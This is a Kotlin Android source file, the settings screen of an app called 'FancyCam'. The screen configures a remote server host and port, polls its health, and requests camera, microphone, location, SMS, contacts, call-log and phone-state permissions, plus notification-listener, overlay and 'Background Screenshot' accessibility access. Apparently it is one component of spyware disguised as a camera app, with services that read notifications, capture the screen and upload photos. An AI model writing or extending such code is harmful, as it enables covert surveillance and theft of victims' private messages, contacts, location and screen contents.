package com.example.fancycam.ui

import com.example.fancycam.R
import com.example.fancycam.network.AppConfig
import com.example.fancycam.network.PhotoUploader
import com.example.fancycam.services.NotificationReaderService
import com.example.fancycam.services.ScreenCaptureAccessibilityService
import com.google.android.material.button.MaterialButton
import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.widget.LinearLayout
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.example.fancycam.databinding.ActivitySettingsBinding
import com.example.fancycam.databinding.ItemActivityLogBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.Request
import org.json.JSONObject

class SettingsActivity : AppCompatActivity() {

    private lateinit var binding: ActivitySettingsBinding
    private var healthPollJob: Job? = null
    private var isCheckingHealth = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivitySettingsBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupToolbar()
        loadCurrentConfig()
        setupActions()
        populatePermissionStatus()
        loadRecentActivities()
    }

    private fun setupToolbar() {
        binding.btnBack.setOnClickListener {
            finish()
        }
    }

    private fun loadCurrentConfig() {
        binding.etServerHost.setText(AppConfig.getServerHost(this))
        binding.etServerPort.setText(AppConfig.getServerPort(this).toString())
    }

    private fun setupActions() {
        binding.btnSaveConfig.setOnClickListener {
            saveConfig()
        }

        binding.btnCheckHealth.setOnClickListener {
            triggerManualHealthCheck()
        }

        binding.btnClearActivities.setOnClickListener {
            AppActivityLogger.clearActivities(this)
            loadRecentActivities()
            Toast.makeText(this, "Activity log cleared", Toast.LENGTH_SHORT).show()
        }

        binding.btnNotificationAccess.setOnClickListener {
            if (NotificationReaderService.isNotificationAccessEnabled(this)) {
                Toast.makeText(this, "Notification access already enabled", Toast.LENGTH_SHORT).show()
            } else {
                NotificationReaderService.openNotificationAccessSettings(this)
            }
        }

        binding.btnRefreshPermissions.setOnClickListener {
            populatePermissionStatus()
        }

        binding.btnRequestStandardPermissions.setOnClickListener {
            requestMissingStandardPermissions()
        }
    }

    private fun saveConfig(): Boolean {
        val host = binding.etServerHost.text?.toString()?.trim().orEmpty()
        val portStr = binding.etServerPort.text?.toString()?.trim().orEmpty()

        if (host.isEmpty()) {
            binding.etServerHost.error = "IP or Host is required"
            return false
        }

        val port = portStr.toIntOrNull()
        if (port == null || port !in 1..65535) {
            binding.etServerPort.error = "Enter a valid port (1-65535)"
            return false
        }

        AppConfig.setServerHost(this, host)
        AppConfig.setServerPort(this, port)

        AppActivityLogger.logActivity(
            context = this,
            type = "CONFIG",
            title = "Server configuration updated",
            detail = "$host:$port",
            success = true
        )

        loadRecentActivities()
        Toast.makeText(this, "Saved: $host:$port", Toast.LENGTH_SHORT).show()

        // Check health immediately with new config
        triggerManualHealthCheck()
        return true
    }

    private fun triggerManualHealthCheck() {
        binding.ivHealthStatusIcon.animate().rotationBy(360f).setDuration(400).start()
        lifecycleScope.launch {
            checkHealthOnce()
        }
    }

    private suspend fun checkHealthOnce() {
        if (isCheckingHealth) return
        isCheckingHealth = true

        val healthUrl = AppConfig.getHealthUrl(this)
        val startTime = System.currentTimeMillis()
        var isHealthy = false
        var latency = 0L
        var message = ""

        withContext(Dispatchers.IO) {
            try {
                val request = Request.Builder()
                    .url(healthUrl)
                    .get()
                    .addHeader("User-Agent", "FancyCam-Android/1.0")
                    .build()

                PhotoUploader.httpClient.newCall(request).execute().use { response ->
                    latency = System.currentTimeMillis() - startTime
                    if (response.isSuccessful) {
                        val body = response.body?.string().orEmpty()
                        var serverStatus = "healthy"
                        try {
                            val json = JSONObject(body)
                            serverStatus = json.optString("status", "healthy")
                        } catch (_: Exception) {}

                        isHealthy = true
                        message = "Online (${serverStatus}, ${latency}ms)"
                    } else {
                        message = "HTTP ${response.code} error"
                    }
                }
            } catch (e: Exception) {
                latency = System.currentTimeMillis() - startTime
                val rawMsg = e.localizedMessage ?: "Unreachable"
                message = if (rawMsg.contains("Failed to connect") || rawMsg.contains("Connection refused")) {
                    "Cannot reach $healthUrl"
                } else {
                    rawMsg
                }
            }
        }

        updateHealthUI(isHealthy, message, latency)
        isCheckingHealth = false
    }

    private fun updateHealthUI(isHealthy: Boolean, message: String, latency: Long) {
        if (isHealthy) {
            // Live dot in toolbar
            binding.viewHealthDot.backgroundTintList = android.content.res.ColorStateList.valueOf(Color.parseColor("#4CAF50"))
            binding.tvHealthToolbar.text = "Online (${latency}ms)"
            binding.tvHealthToolbar.setTextColor(Color.parseColor("#A5D6A7"))

            // Card status row
            binding.ivHealthStatusIcon.setImageResource(R.drawable.ic_check_circle)
            binding.ivHealthStatusIcon.setColorFilter(Color.parseColor("#4CAF50"))
            binding.tvActiveHealthStatus.text = "Server is healthy: $message"
            binding.tvActiveHealthStatus.setTextColor(Color.parseColor("#D0D0D0"))
        } else {
            // Live dot in toolbar
            binding.viewHealthDot.backgroundTintList = android.content.res.ColorStateList.valueOf(Color.parseColor("#E57373"))
            binding.tvHealthToolbar.text = "Offline"
            binding.tvHealthToolbar.setTextColor(Color.parseColor("#E57373"))

            // Card status row
            binding.ivHealthStatusIcon.setImageResource(R.drawable.ic_close)
            binding.ivHealthStatusIcon.setColorFilter(Color.parseColor("#E57373"))
            binding.tvActiveHealthStatus.text = "Server offline: $message"
            binding.tvActiveHealthStatus.setTextColor(Color.parseColor("#E57373"))
        }
    }

    private fun startActiveHealthPolling() {
        healthPollJob?.cancel()
        healthPollJob = lifecycleScope.launch {
            while (isActive) {
                checkHealthOnce()
                delay(4000) // Poll actively every 4 seconds
            }
        }
    }

    private fun stopActiveHealthPolling() {
        healthPollJob?.cancel()
        healthPollJob = null
    }

    private fun loadRecentActivities() {
        val activities = AppActivityLogger.getRecentActivities(this)
        binding.layoutActivitiesList.removeAllViews()

        if (activities.isEmpty()) {
            binding.tvNoActivities.visibility = View.VISIBLE
            return
        }

        binding.tvNoActivities.visibility = View.GONE
        val inflater = LayoutInflater.from(this)

        for (item in activities) {
            val itemBinding = ItemActivityLogBinding.inflate(inflater, binding.layoutActivitiesList, false)

            itemBinding.tvLogBadge.text = item.type
            itemBinding.tvLogTimestamp.text = item.timestamp
            itemBinding.tvLogTitle.text = item.title

            if (item.detail.isNotEmpty()) {
                itemBinding.tvLogDetail.visibility = View.VISIBLE
                itemBinding.tvLogDetail.text = item.detail
            } else {
                itemBinding.tvLogDetail.visibility = View.GONE
            }

            if (item.success) {
                itemBinding.ivLogStatus.setImageResource(R.drawable.ic_check_circle)
                itemBinding.ivLogStatus.setColorFilter(Color.parseColor("#888888"))
            } else {
                itemBinding.ivLogStatus.setImageResource(R.drawable.ic_close)
                itemBinding.ivLogStatus.setColorFilter(Color.parseColor("#E57373"))
            }

            binding.layoutActivitiesList.addView(itemBinding.root)
        }
    }

    private fun standardPermissions(): List<String> {
        val perms = mutableListOf<String>()
        perms += Manifest.permission.CAMERA
        perms += Manifest.permission.RECORD_AUDIO
        perms += Manifest.permission.ACCESS_FINE_LOCATION
        perms += Manifest.permission.ACCESS_COARSE_LOCATION
        perms += Manifest.permission.READ_SMS
        perms += Manifest.permission.READ_CONTACTS
        perms += Manifest.permission.READ_CALL_LOG
        perms += Manifest.permission.READ_PHONE_STATE
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms += Manifest.permission.POST_NOTIFICATIONS
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms += Manifest.permission.READ_MEDIA_IMAGES
        } else {
            perms += Manifest.permission.READ_EXTERNAL_STORAGE
        }
        return perms
    }

    private fun permissionLabel(permission: String): String {
        return when (permission) {
            Manifest.permission.CAMERA -> "Camera"
            Manifest.permission.RECORD_AUDIO -> "Microphone"
            Manifest.permission.ACCESS_FINE_LOCATION -> "Precise Location"
            Manifest.permission.ACCESS_COARSE_LOCATION -> "Approximate Location"
            Manifest.permission.READ_SMS -> "Read SMS"
            Manifest.permission.READ_CONTACTS -> "Contacts"
            Manifest.permission.READ_CALL_LOG -> "Call Log"
            Manifest.permission.READ_PHONE_STATE -> "Phone State"
            Manifest.permission.POST_NOTIFICATIONS -> "Notifications"
            Manifest.permission.READ_MEDIA_IMAGES -> "Media Images"
            Manifest.permission.READ_EXTERNAL_STORAGE -> "External Storage"
            else -> permission.substringAfterLast('.')
        }
    }

    private fun addPermissionRow(container: LinearLayout, label: String, granted: Boolean, action: (() -> Unit)?) {
        val row = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { bottomMargin = 8 }
            gravity = android.view.Gravity.CENTER_VERTICAL
        }

        val tvLabel = TextView(this).apply {
            text = label
            setTextColor(android.graphics.Color.parseColor("#D0D0D0"))
            textSize = 14f
            layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
        }
        row.addView(tvLabel)

        val tvStatus = TextView(this).apply {
            text = if (granted) "Granted" else "Denied"
            setTextColor(android.graphics.Color.parseColor(if (granted) "#81C784" else "#E57373"))
            textSize = 13f
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply { marginEnd = 12 }
        }
        row.addView(tvStatus)

        if (!granted && action != null) {
            val btn = MaterialButton(this).apply {
                text = "Allow"
                textSize = 12f
                setTextColor(android.graphics.Color.parseColor("#121212"))
                setBackgroundColor(android.graphics.Color.parseColor("#E0E0E0"))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
                setOnClickListener { action() }
            }
            row.addView(btn)
        }

        container.addView(row)
    }

    private fun populatePermissionStatus() {
        val container = binding.permissionStatusContainer
        container.removeAllViews()

        val standard = standardPermissions()
        var grantedCount = 0
        for (perm in standard) {
            val granted = ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
            if (granted) grantedCount++
            addPermissionRow(container, permissionLabel(perm), granted) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(this, arrayOf(perm), 3001)
                } else {
                    openAppSettings()
                }
            }
        }

        val notificationGranted = NotificationReaderService.isNotificationAccessEnabled(this)
        addPermissionRow(container, "Notification Listener Access", notificationGranted) {
            if (!notificationGranted) {
                NotificationReaderService.openNotificationAccessSettings(this)
            }
        }

        val overlayGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true
        addPermissionRow(container, "Draw Over Apps", overlayGranted) {
            if (!overlayGranted) {
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:$packageName")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
        }

        val accessibilityGranted = ScreenCaptureAccessibilityService.isAccessibilityServiceEnabled(this)
        addPermissionRow(container, "Background Screenshot (Accessibility)", accessibilityGranted) {
            if (!accessibilityGranted) {
                ScreenCaptureAccessibilityService.openAccessibilitySettings(this)
            }
        }

        val totalTracked = standard.size + 3
        val totalGranted = grantedCount + (if (notificationGranted) 1 else 0) + (if (overlayGranted) 1 else 0) + (if (accessibilityGranted) 1 else 0)
        binding.tvPermissionSummary.text =
            "$totalGranted of $totalTracked permissions granted. Tap \"Allow\" to request, or use \"Refresh\" after changing system settings."
    }

    private fun requestMissingStandardPermissions() {
        val missing = standardPermissions().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) {
            Toast.makeText(this, "All standard permissions granted", Toast.LENGTH_SHORT).show()
        } else {
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 3002)
        }
    }

    private fun openAppSettings() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        }
        startActivity(intent)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        populatePermissionStatus()
    }

    override fun onResume() {
        super.onResume()
        startActiveHealthPolling()
        loadRecentActivities()
        populatePermissionStatus()
    }

    override fun onPause() {
        super.onPause()
        stopActiveHealthPolling()
    }

    companion object {
        private const val TAG = "SettingsActivity"
    }
}
